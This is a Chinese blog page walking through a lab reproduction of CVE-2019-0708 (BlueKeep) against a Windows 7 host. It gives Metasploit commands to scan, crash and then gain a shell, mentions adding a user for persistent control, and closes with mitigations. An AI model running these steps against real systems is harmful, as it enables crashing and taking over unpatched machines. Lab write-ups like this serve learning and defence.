<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CVE-2019-0708（远程桌面服务RCE）漏洞复现（超详细Getshell） - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="CVE-2019-0708（远程桌面服务RCE）漏洞复现（超详细Getshell）" />
<meta property="og:description" content="目录
漏洞介绍
影响版本
漏洞复现
靶场环境
开始攻击
漏洞修复
漏洞介绍 通过利用远程桌面的3389端口，RDP协议进行攻击，从而导致机器蓝屏瘫痪。该漏洞的触发无需任何用户交互操作，这就意味着，存在漏洞的计算机只要联网，无需任何操作，就有可能遭遇黑客远程攻击，运行恶意代码等，极具破坏性！
影响版本 该漏洞影响旧版本的Windows系统，包括：
Windows 7、Windows Server 2008 R2、Windows Server 2008、Windows 2003、Windows XP。
Windows 8和Windows 10及之后版本不受此漏洞影响。
漏洞复现 靶场环境 靶机ip地址win 7192.168.0.128kali192.168.0.132 前提条件：win7允许远程桌面连接，关闭防火墙，两者可以通信
开始攻击 使用kali的msf模块
搜索 0708 模块
这里编号0为探测模块 编号1、2、3为攻击模块
我们先使用编号为0的模块探索目标主机是否有漏洞
use 0
show options
set rhosts 192.168.0.128
run
接下来使用编号为1的模块进行攻击
use 1
show options
set rhosts 192.168.0.128
show targets
set target 5
run
攻击后发现目标主机蓝屏了，接下来等待目标主机重启后我们进行getshell
首先 Ctrl&#43;Z 先退出msf
接着重新进去重复之前操作
msfconsole
search 0708
use 1
set rhosts 192." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/001c06a0c30a6c067c1ad523b7076fdb/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-10-28T14:15:00+08:00" />
<meta property="article:modified_time" content="2023-10-28T14:15:00+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CVE-2019-0708（远程桌面服务RCE）漏洞复现（超详细Getshell）</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-toc" style="margin-left:40px;"><a href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D" rel="nofollow">漏洞介绍</a></p> 
<p id="%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-toc" style="margin-left:40px;"><a href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC" rel="nofollow">影响版本</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-toc" style="margin-left:40px;"><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" rel="nofollow">漏洞复现</a></p> 
<p id="%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83-toc" style="margin-left:80px;"><a href="#%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83" rel="nofollow">靶场环境</a></p> 
<p id="%E5%BC%80%E5%A7%8B%E6%94%BB%E5%87%BB-toc" style="margin-left:80px;"><a href="#%E5%BC%80%E5%A7%8B%E6%94%BB%E5%87%BB" rel="nofollow">开始攻击</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-toc" style="margin-left:40px;"><a href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D" rel="nofollow">漏洞修复</a></p> 
<hr id="hr-toc"> 
<h3>漏洞介绍</h3> 
<blockquote> 
 <p>通过利用远程桌面的3389端口，RDP协议进行攻击，从而导致机器蓝屏瘫痪。该漏洞的触发无需任何用户交互操作，这就意味着，存在漏洞的计算机只要联网，无需任何操作，就有可能遭遇黑客远程攻击，运行恶意代码等，极具破坏性！</p> 
</blockquote> 
<h3 id="%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC">影响版本</h3> 
<blockquote> 
 <p>该漏洞影响旧版本的Windows系统，包括：</p> 
 <p>Windows 7、Windows Server 2008 R2、Windows Server 2008、Windows 2003、Windows XP。</p> 
 <p>Windows 8和Windows 10及之后版本不受此漏洞影响。</p> 
</blockquote> 
<h3 id="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</h3> 
<h4 id="%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83">靶场环境</h4> 
<table border="1" cellpadding="1" cellspacing="1" style="width:500px;"><tbody><tr><td style="text-align:center;">靶机</td><td style="text-align:center;">ip地址</td></tr><tr><td style="text-align:center;">win 7</td><td style="text-align:center;">192.168.0.128</td></tr><tr><td style="text-align:center;">kali</td><td style="text-align:center;">192.168.0.132</td></tr></tbody></table> 
<p>前提条件：win7允许远程桌面连接，关闭防火墙，两者可以通信</p> 
<p><img alt="" height="652" src="https://images2.imgbox.com/f2/c4/S4M3VNeJ_o.png" width="1041"></p> 
<p><img alt="" height="550" src="https://images2.imgbox.com/b1/62/eYOwNxGJ_o.png" width="541"> </p> 
<h4 id="%E5%BC%80%E5%A7%8B%E6%94%BB%E5%87%BB">开始攻击</h4> 
<p>使用kali的msf模块</p> 
<p><img alt="" height="652" src="https://images2.imgbox.com/a3/13/mAdzlX0Q_o.png" width="538"></p> 
<p>搜索 0708 模块</p> 
<p><img alt="" height="246" src="https://images2.imgbox.com/45/c7/bM30NuL0_o.png" width="1200"></p> 
<p>这里编号0为探测模块 编号1、2、3为攻击模块</p> 
<p>我们先使用编号为0的模块探索目标主机是否有漏洞</p> 
<blockquote> 
 <p>use 0</p> 
 <p>show options</p> 
 <p>set rhosts 192.168.0.128</p> 
 <p>run</p> 
</blockquote> 
<p><img alt="" height="556" src="https://images2.imgbox.com/d8/6e/Vb1YAyao_o.png" width="1196"></p> 
<p>接下来使用编号为1的模块进行攻击</p> 
<blockquote> 
 <p>use 1</p> 
 <p>show options</p> 
 <p>set rhosts 192.168.0.128</p> 
 <p>show targets</p> 
 <p>set target 5</p> 
 <p>run</p> 
</blockquote> 
<p><img alt="" height="759" src="https://images2.imgbox.com/d1/70/qlkJp3Ll_o.png" width="773"></p> 
<p><img alt="" height="532" src="https://images2.imgbox.com/25/a7/hppie9w1_o.png" width="781"></p> 
<p>攻击后发现目标主机蓝屏了，接下来等待目标主机重启后我们进行getshell</p> 
<p>首先 Ctrl+Z 先退出msf</p> 
<p>接着重新进去重复之前操作</p> 
<blockquote> 
 <p>msfconsole</p> 
 <p>search 0708</p> 
 <p>use 1</p> 
 <p>set rhosts 192.168.0.128</p> 
 <p>set target 5</p> 
 <p>run</p> 
</blockquote> 
<p><img alt="" height="506" src="https://images2.imgbox.com/7f/57/8rRcxvMh_o.png" width="939"></p> 
<p>经过漫长的等待后，发现成功拿到shell，接下来就可以进行一系列后续操作了或者直接新建用户将用户添加到用户组使用远程桌面连接控住目标主机了</p> 
<h3 id="%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D">漏洞修复</h3> 
<blockquote> 
 <p>关闭3389，或者在防火墙中设置白名单</p> 
 <p>禁止3389远程端口，只允许自己的ip进行通信</p> 
 <p>关闭远程桌面服务</p> 
 <p>使用官方补丁进行修补</p> 
</blockquote>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/1e330e99a55f43fd8dad0c5ef7c0fc55/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">数据结构 | 栈（顺序栈&#43;链栈）的基本实现</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/8b1cd5ed8694a278a4efde971d7761d3/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【人脸识别】基于matlab GUI BP神经网络双人脸识别（含识别率）【含Matlab源码 2383期】</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>